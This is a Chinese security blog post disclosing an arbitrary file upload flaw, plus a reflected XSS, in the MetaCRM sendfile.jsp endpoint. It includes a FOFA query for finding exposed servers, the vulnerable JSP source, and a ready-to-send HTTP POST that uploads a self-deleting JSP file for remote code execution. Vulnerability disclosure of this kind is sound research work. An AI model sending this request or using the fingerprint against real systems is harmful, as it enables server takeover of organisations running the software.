---
title: "MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞"
source: https://mrxn.net/jswz/metasoft-business-sendfile-upload-rce.html
asset_dir: assets/metacrm-客户关系管理系统-sendfile.jsp-任意文件上传漏洞
---

# MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/30 08:25
* 1694浏览
* [0评论](#comment)
* 45分钟阅读

深入探索

鉴权

业务过程

软件部署


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

MetaCRM 是一款广泛应用于企业客户信息管理、业务流程自动化及销售支持的[客户关系管理](#)系统。该系统中的 sendfile.jsp 接口存在[任意文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，攻击者无需经过严格身份验证即可向服务器上传任意类型的文件，包括可执行的恶意[脚本](#)。一旦利用此漏洞，攻击者可能在服务器上部署后门、WebShell 等恶意程序，从而实现[远程代码执行](https://mrxn.net/tag/rce)、服务器控制，甚至进一步窃取敏感数据或破坏业务系统的正常运行。该漏洞严重威胁系统的安全性与数据完整性，需及时修补和加固防护。

客户关系管理

# 影响版本

# fofa语法

```
body="/common/scripts/basic.js" && body="www.metacrm.com.cn"
```

深入探索

身份验证

script

部署

# 漏洞分析

我们直接看 `sendfile.jsp` 的业务逻辑实现

```
<%@ page contentType="text/html;charset=UTF-8"%>
<%
//
    com.metasoft.framework.pub.util.UserState us = com.metasoft.framework.model.users.UserManager.getUserBySessionId(session.getId());
    com.metasoft.framework.pub.locale.ResourceService ress=null;
    if (us!=null) {
      ress=us.getRess();
    }
    if (ress==null)
      ress=new com.metasoft.framework.pub.locale.ResourceService();

                com.metasoft.framework.pub.upload.Upload myUpload=new com.metasoft.framework.pub.upload.Upload();
                myUpload.initialize(pageContext);
                myUpload.upload();

                String objectname = myUpload.getRequest().getParameter("objectname");
                String repeatrule=myUpload.getRequest().getParameter("repeatrule");
                String refrule=myUpload.getRequest().getParameter("refrule");
                String filetype = myUpload.getRequest().getParameter("filetype");
//              String filename = myUpload.getRequest().getParameter("filename");
                String flag = myUpload.getRequest().getParameter("flag");
                String fieldimp=myUpload.getRequest().getParameter("fieldimp");
                String affix = myUpload.getFiles().getFile(0).getFileName();
                int iCount = myUpload.getFiles().getFile(0).getSize();
                String path = com.metasoft.framework.pub.util.Path.getUserFile()+"temp"+java.io.File.separator;
                String fileFullName = "";
                if (iCount != 0) {
                    String fieldID = com.metasoft.framework.pub.util.UUID.getID();
                    if(affix.indexOf(".")!=-1)
                        fieldID +=affix.substring(affix.lastIndexOf("."));
                    fileFullName = path+fieldID;    
                    int iSaveCount = myUpload.saveAs(path, fieldID);
                    boolean bSaveCount=iSaveCount==0?true:false;
                    if(bSaveCount){
                        request.setAttribute("uploaderror",ress.getDispMessage("ui.common.importdata.uploadfail")+"!");
                        %>
        <jsp:forward page="/business/common/importdata/home.jsp"/>
    <%

    }
    }else{
            request.setAttribute("uploaderror",ress.getDispMessage("ui.common.importdata.uploadfail")+"!");
        %>
            <jsp:forward page="/business/common/importdata/home.jsp"/>
        <%
    }

    %>  
<html>  
    <body>      
        <form name = "formdata" method ="post" action="/importdata.nextone.do">
            <input type="hidden" name="objectname" value='<%=objectname%>'>
            <input type="hidden" name="repeatrule" value='<%=repeatrule%>'>
            <input type="hidden" name="refrule" value='<%=refrule%>'>
            <input type="hidden" name="fieldimp" value='<%=fieldimp%>'>
            <input type="hidden" name="filetype" value='<%=filetype%>'>
            <input type="hidden" name="filename" value='<%=affix%>'>
            <input type="hidden" name="fullfilename" value='<%=fileFullName%>'>
            <input type="hidden" name ="flag" value='<%=flag %>'>
        </form>
        <script language="JavaScript">
            document.forms['formdata'].submit();
        </script>
    </body>
</html>
```

仅检查了文件大小是否为0，但不限制可上传的文件类型和内容格式，从而导致任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

同时该文件还存在反射性[XSS漏洞](https://mrxn.net/tag/xss)，因HTML表单部分 `<input type="hidden" name="objectname" value='<%=objectname%>'>` 的数据来自用户提交，直接通过 `myUpload.getRequest().getParameter()` 获取，并使用 JSP 表达式 `<%= %>` 直接输出到HTML中。缺失了对输入的转义或 sanitization。其他 repeatrule、refrule、fieldimp、filetype、flag 等参数也是如此。

漏洞预警服务

# 漏洞复现

```
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: metasoft.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp "

<%out.println(new java.util.Random().nextInt(100));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

[![MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞](images/img-001-6f65ea6cdeae.webp)](https://image.mrxn.net/7655917ed38d4f9893bb765161d00b23.webp)

响应里回显了上传文件路径，直接访问，成功执行上传代码达到[RCE](https://mrxn.net/tag/rce)

[![MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞](images/img-002-8e13d1f310c9.webp)](https://image.mrxn.net/e8ebaf8d346a490f8dacb2ab616623c6.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[MetaCRM 客户关系管理系统 sendfile.jsp 任意文件上传漏洞](https://mrxn.net/jswz/metasoft-business-sendfile-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/metasoft-business-sendfile-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-business-sendfile-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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